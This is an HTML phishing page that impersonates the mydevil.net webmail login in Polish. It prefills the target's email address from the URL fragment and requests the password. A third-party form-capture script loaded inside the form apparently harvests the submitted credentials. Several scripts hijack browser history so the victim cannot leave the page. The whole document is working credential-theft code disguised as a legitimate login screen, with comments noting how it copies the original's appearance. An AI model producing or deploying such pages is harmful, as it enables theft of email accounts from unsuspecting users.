<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mydevil.net - Zaloguj się do poczty</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f7ebe6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Top Brand Navigation Bar */
        .top-navbar {
            background-color: #261410;
            width: 100%;
            padding: 14px 40px;
            display: flex;
            align-items: center;
        }

        .brand-logo {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #ffffff;
            font-size: 20px;
            font-weight: bold;
            text-decoration: none;
        }

        /* Replicating the little devil horns graphic marker */
        .brand-logo::before {
            content: '😈';
            font-size: 18px;
        }

        /* Main Workspace Container with faint background logo watermark decoration */
        .workspace {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            background-image: radial-gradient(rgba(224, 69, 39, 0.03) 2px, transparent 2px);
            background-size: 30px 30px;
            position: relative;
        }

        /* Large washed out background logo texture text placeholder */
        .bg-watermark-text {
            position: absolute;
            font-size: 140px;
            font-weight: 900;
            color: rgba(224, 69, 39, 0.04);
            user-select: none;
            pointer-events: none;
            z-index: 1;
            white-space: nowrap;
        }

        /* Floating Centered Login Frame Component Card */
        .login-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 400px;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(38, 20, 16, 0.08);
            z-index: 5;
        }

        .card-title {
            font-size: 22px;
            color: #261410;
            font-weight: 500;
            margin-bottom: 30px;
            text-align: center;
        }

        .input-row {
            display: flex;
            width: 100%;
            height: 42px;
            margin-bottom: 14px;
        }

        /* Small structural icons prefix container element */
        .icon-box {
            width: 42px;
            background-color: #ffffff;
            border: 1px solid #dcdcdc;
            border-right: none;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333333;
            font-size: 13px;
        }

        .form-control {
            flex: 1;
            padding: 0 14px;
            border: 1px solid #dcdcdc;
            font-size: 14px;
            color: #333333;
            outline: none;
        }

        /* Accent red outline highlighted focus field replica */
        .input-row.alert-active .form-control {
            border-color: #e04527;
        }
        .input-row.alert-active .icon-box {
            border-color: #e04527;
        }

        /* Dropdown selector panel matching original layout */
        .select-control {
            flex: 1;
            padding: 0 14px;
            border: 1px solid #dcdcdc;
            font-size: 14px;
            color: #333333;
            outline: none;
            background-color: #ffffff;
            cursor: pointer;
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;utf8,<svg fill='%23333333' height='24' viewBox='0 0 24 24' width='24' xmlns='http://w3.org'><path d='M7 10l5 5 5-5z'/><path d='M0 0h24v24H0z' fill='none'/></svg>");
            background-repeat: no-repeat;
            background-position: right 10px center;
        }

        .form-control::placeholder {
            color: #a0a0a0;
        }

        /* Distinctive Burnt Orange Brick-Colored Rectangular Button */
        .submit-btn {
            width: 100%;
            background-color: #e04527;
            color: #ffffff;
            border: none;
            height: 46px;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.15s ease;
        }

        .submit-btn:hover {
            background-color: #c9371c;
        }

        /* Fixed Background Desktop System Watermark Overlay Component */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(38, 20, 16, 0.15);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
            z-index: 10;
        }
    </style>
</head>
<body>

    <!-- Top Branding Navigation Row -->
    <nav class="top-navbar">
        <a href="#" class="brand-logo">mydevil.net</a>
    </nav>

    <!-- Center Interactive Workspace -->
    <main class="workspace">
        <div class="bg-watermark-text">mydevil.net</div>

        <!-- Floating UI Box -->
        <div class="login-card">
            <h1 class="card-title">Zaloguj się do poczty</h1>
                            
            <form action="" method="POST">
                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
                <!-- Highlight class replicates original red border accent active line -->
                <div class="input-row alert-active">
                    <div class="icon-box">👤</div>
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
                
                <div class="input-row">
                    <div class="icon-box">🔒</div>
<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>

                <div class="input-row">
                    <div class="icon-box">🌐</div>
                    <select name="lang" class="select-control">
                       
                        <option value="pl">Polski</option>
                    </select>
                </div>
                
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </div>
    </main>


    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
